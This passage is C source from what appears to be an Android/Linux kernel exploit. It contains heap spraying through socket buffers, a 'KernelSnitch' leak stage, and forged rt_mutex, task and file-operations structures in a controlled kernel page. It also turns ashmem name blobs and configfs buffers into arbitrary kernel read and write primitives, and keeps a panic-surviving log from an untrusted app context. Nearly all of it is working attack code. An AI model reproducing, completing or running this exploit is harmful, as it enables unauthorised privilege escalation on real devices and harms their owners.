          iov.iov_len = SKB_SEND_SIZE;
          memset(&m, 0, sizeof(m));
          m.msg_iov = &iov;
          m.msg_iovlen = 1;
          sent = sendmsg(sfds[i * 2], &m, 0);
          if (sent != (ssize_t)SKB_SEND_SIZE) {
            break;
          }
          made++;
        }
        pr_info("KS_SPRAY_SOCKETS made=%zu want=%ld cpu=%d\n", made, want,
                sched_getcpu());
        if (made > 0) {
          multi_spray = 1;
        }
      }
    }
  }

  int sends = multi_spray ? 0 : SKB_RECLAIM_SENDS;
  {
    const char *s = getenv("KS_RECLAIM_SENDS");
    if (s && *s) sends = atoi(s);
  }
  int sent_ok = 0;
  for (int i = 0; i < sends; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
    sent_ok++;
    if (sent_ok == 1) {
      mm_slab_log("post-first-send");
      slab32_log("post-first-send");
      ks_page_peek_report_at("post-first-send");
    }
  }
  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  /* Neighbours were held back so the target page could not merge; release
   * them only now that our skbs own the page. */
  if (hold_neighbours) {
    for (size_t i = 0; i < lead_ctx.mm_cnt; i++) {
      if (lead_ctx.memfds[i] >= 0) {
        SYSCHK(close(lead_ctx.memfds[i]));
        lead_ctx.memfds[i] = -1;
      }
      if (lead_ctx.childs[i] > 0) {
        kill_child(lead_ctx.childs[i]);
        lead_ctx.childs[i] = -1;
      }
    }
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      if (post_ctx.childs[i] > 0) {
        kill_child(post_ctx.childs[i]);
        post_ctx.childs[i] = -1;
      }
    }
  }
  /* The rest of the drain is only useful after the spray: it keeps the mm
   * cache from handing the target page back while the skbs are allocated. */
  for (size_t i = prep_burst; i < prepare_ctx.mm_cnt; i++) {
    if (prepare_ctx.memfds[i] >= 0) {
      SYSCHK(close(prepare_ctx.memfds[i]));
    }
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }
  if (trigger_fds != NULL) {
    ks_trigger_release(trigger_fds, trigger_count);
  }
  trigger_fds = NULL;
  trigger_count = 0;
  ks_buddy_release(buddy_fds, buddy_n);
  buddy_fds = NULL;
  buddy_n = 0;

  pr_info("KS_TIME spray_ms=%.0f total_ms=%.0f\n", ks_now_ms() - ks_t0,
          ks_now_ms() - ks_t0);
  pr_info("SKB_RECLAIM sent=%d/%d base=%016zx ", sent_ok, sends, base);
  mm_slab_log("post-spray");
  ks_page_peek_report();
  if (ks) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_S2) {
    /* S2 is one-shot: no stale-page refresh after a failed preparation. */
    max_attempts = 1;
  } else if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (ks_discard_failed) {
      pr_warning("prepare_kernel_page not retried: target slab discard not "
                 "attributed (page at base is not ours)\n");
      break;
    }
    if (base) {
      return base;
    }
    if (leak_stage_failed) {
      pr_warning("prepare_kernel_page not retried: KernelSnitch leak stage failed\n");
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
#ifdef CFGOPS_4_19_STYLE
  /* 4.19: ashmem name starts at asma+0 with no prefix; fake configfs_buffer
   * gets page=target, count=len, needs_read_fill=0, then pread from pos 0:
   * simple_read_from_buffer(buf, len, &pos0, page=target, available=len) */
#if ASHMEM_NAME_PREFIX_LEN == 0
  put64(blob, 0 - ASHMEM_NAME_PREFIX_LEN, len); /* buffer->count */
#else
  /* struct ashmem_area.name starts with the fixed "dev/ashmem/" prefix, so
   * configfs_buffer.count (offset 0) cannot be written from the name blob.
   * It stays the prefix bytes interpreted as a large positive u64, which
   * simple_read_from_buffer treats as an effectively unlimited source. */
#endif
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }
  errno = 0;
  ssize_t rd = pread(fd, data, len, 0);
  return rd;
#else
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
#endif
}

uintptr_t page_image_base(void) { return page_image.base; }

/* Report the controlled page.  With an fd that has the fake fops installed
 * (the only kernel-read primitive in this tree) this reads the page at
 * page_image.base; otherwise it states that it is reporting intent only. */
void page_image_report(int fd, const char *tag) {
  if (!page_image.built) {
    pr_info("KS_PUNCH_DUMP %s unwritten\n", tag);
    return;
  }
  uintptr_t base = page_image_base();
  if (fd < 0) {
    pr_info("KS_PUNCH_DUMP intent tag=%s base=%016zx lock=%016zx "
            "w0=%016zx task=%016zx fops=%016zx bias=%zx rb_root=%016zx "
            "leftmost=%016zx owner=%016zx w0_lock=%016zx blocked=%016zx\n",
            tag, (size_t)base, (size_t)fake_lock, (size_t)fake_w0,
            (size_t)fake_task, (size_t)fake_fops, page_image.bias,
            (size_t)page_image.want_rb, (size_t)page_image.want_leftmost,
            (size_t)page_image.want_owner, (size_t)page_image.want_w0_lock,
            (size_t)page_image.want_blocked);
    return;
  }
  uint64_t raw[6] = {0};
  ssize_t n = configfs_read_once(fd, base + LOCK_OFF, raw, sizeof(raw));
  if (n != (ssize_t)sizeof(raw)) {
    pr_info("KS_PUNCH_DUMP kernel tag=%s base=%016zx read=unavailable "
            "ret=%zd errno=%d\n", tag, (size_t)base, n, errno);
    return;
  }
  int ours = raw[2] == page_image.want_rb &&
             raw[3] == page_image.want_leftmost &&
             raw[4] == page_image.want_owner;
  pr_info("KS_PUNCH_DUMP kernel tag=%s base=%016zx read=%s lock=%016zx "
          "rb=%016zx leftmost=%016zx owner=%016zx want_rb=%016zx "
          "want_leftmost=%016zx want_owner=%016zx\n",
          tag, (size_t)base, ours ? "ours" : "foreign",
          (size_t)raw[0], (size_t)raw[2], (size_t)raw[3], (size_t)raw[4],
          (size_t)page_image.want_rb, (size_t)page_image.want_leftmost,
          (size_t)page_image.want_owner);
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < g_direct_map_end;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}

/* ================= round-2: forced real-time disk logging ================= */
int g_exlog_fd = -1;
char g_exlog_path[256] = {0};

void ks_relocate_fd_min(int *fd, int min_fd) {
  int high;
  if (fd == NULL || *fd < 0 || *fd >= min_fd) {
    return;
  }
  high = fcntl(*fd, F_DUPFD, min_fd);
  if (high >= 0) {
    close(*fd);
    *fd = high;
  }
}

int s2_payload_contract_ok(void) {
  if (!page_image.buf || !page_base || !fake_lock || !fake_w0 || !fake_task) {
    pr_error("S2 contract missing controlled-page state\n");
    return 0;
  }

  size_t used_end = (size_t)SKB_FRAG_BIAS +
                    FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
  if (used_end > SKB_SEND_SIZE ||
      (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE) {
    pr_error("S2 contract prefix exceeds controlled skb size end=%zu\n",
             used_end);
    return 0;
  }

  {
    const unsigned char *p = page_image.buf + SKB_FRAG_BIAS;
    uint64_t got64;
    uint32_t got32;

    memcpy(&got32, p + LOCK_OFF, sizeof(got32));
    memcpy(&got64, p + LOCK_OFF + RT_MUTEX_WAITERS_OFF, sizeof(got64));
    if (got32 != 0 || got64 != fake_w0) return 0;
    memcpy(&got64, p + LOCK_OFF + RT_MUTEX_LEFTMOST_OFF, sizeof(got64));
    if (got64 != fake_w0) return 0;
    memcpy(&got64, p + LOCK_OFF + RT_MUTEX_OWNER_OFF, sizeof(got64));
    if (got64 != (fake_task | 1)) return 0;

    static const size_t w0_offsets[] = {
      0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48,
      0x50, 0x58
    };
    const uint64_t w0_expect[] = {
      1, 0, 0, 1, 0, 0, fake_task, fake_lock, 140, 0, 0, 0, 0
    };
    for (size_t i = 0; i < sizeof(w0_offsets) / sizeof(w0_offsets[0]); ++i) {
      memcpy(&got64, p + W0_OFF + w0_offsets[i], sizeof(got64));
      if (got64 != w0_expect[i]) return 0;
    }

    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, sizeof(got32));
    if (got32 != 0x100) return 0;
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, sizeof(got32));
    if (got32 != FAKE_TASK_PRIO) return 0;
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF,
           sizeof(got32));
    if (got32 != FAKE_TASK_PRIO) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + 0x420, sizeof(got64));
    if (got64 != 0) return 0;
    memcpy(&got32, p + FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,
           sizeof(got32));
    if (got32 != 0) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
           sizeof(got64));
    if (got64 != fake_w0 + 0x18) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 8,
           sizeof(got64));
    if (got64 != fake_w0 + 0x18) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF,
           sizeof(got64));
    if (got64 != fake_task) return 0;
    memcpy(&got64, p + FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF,
           sizeof(got64));
    if (got64 != 0) return 0;

    for (size_t off = FOPS_TABLE_OFF; off + 8 <= FOPS_TABLE_OFF + 0xe8;
         off += 8) {
      memcpy(&got64, p + off, sizeof(got64));
      if (got64 != 0) return 0;
    }
  }
  return 1;
}

int s2_reclaim_fd(void) {
  return reclaim_sv[1];
}

void exlog_protect_fd(void) {
  ks_relocate_fd_min(&g_exlog_fd, KS_FD_PROTECT_MIN);
}

void exlog_open(void) {
  if (g_exlog_fd >= 0) {
    return;
  }
  /* /data/local/tmp keeps working after a wrong-delta fops write takes
   * down FUSE (/sdcard).  The file must be pre-created 666 by adb; an
   * untrusted_app cannot create it, so open() fails and we fall back.
   * No O_APPEND: SELinux grants untrusted_app { write } on shell_data_file
   * but not { append } (silently dontaudit'd), so an O_APPEND open fails
   * while the O_TRUNC-style writes used by the export files succeed. */
  {
    int fd = open("/data/local/tmp/ks_log.txt",
                  O_WRONLY | O_CLOEXEC, 0666);
    if (fd >= 0) {
      g_exlog_fd = fd;
      snprintf(g_exlog_path, sizeof(g_exlog_path),
               "/data/local/tmp/ks_log.txt");
      exlog_writef("+", "exlog open path=%s pid=%d uid=%u\n",
                   g_exlog_path, getpid(), getuid());
      return;
    }
  }
  time_t t = time(NULL);
  struct tm tmv;
  localtime_r(&t, &tmv);
  char ts[32];
  strftime(ts, sizeof(ts), "%Y%m%d_%H%M%S", &tmv);
  const char *dirs[] = {
    "/sdcard/Download",
    "/sdcard/Downloads",
    "/data/local/tmp",
    NULL,
  };
  for (int i = 0; dirs[i]; i++) {
    snprintf(g_exlog_path, sizeof(g_exlog_path), "%s/log_%s.txt", dirs[i], ts);
    int fd = open(g_exlog_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
    if (fd >= 0) {
      g_exlog_fd = fd;
      break;
    }
  }
  if (g_exlog_fd >= 0) {
    exlog_writef("+", "exlog open path=%s pid=%d uid=%u\n",
                 g_exlog_path, getpid(), getuid());
  }
}

void exlog_writef(const char *level, const char *fmt, ...) {
  char msg[1200];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(msg, sizeof(msg), fmt, ap);
  va_end(ap);

  /* keep the original console output */
  fprintf(stdout, "[%s] %s", level, msg);
  fflush(stdout);

  if (g_exlog_fd < 0) {
    exlog_open();  /* lazy open (covers fork children / early calls) */
    if (g_exlog_fd < 0) {
      return;
    }
  }
  char line[1400];
  int n = snprintf(line, sizeof(line), "[%d][%s] ", (int)getpid(), level);
  if (n < 0) {
    return;
  }
  size_t used = (size_t)n;
  if (used < sizeof(line)) {
    strncat(line, msg, sizeof(line) - used - 1);
  }
  ssize_t wr = write(g_exlog_fd, line, strlen(line));
  (void)wr;
  fsync(g_exlog_fd);  /* forced flush: survive kernel panic */
}
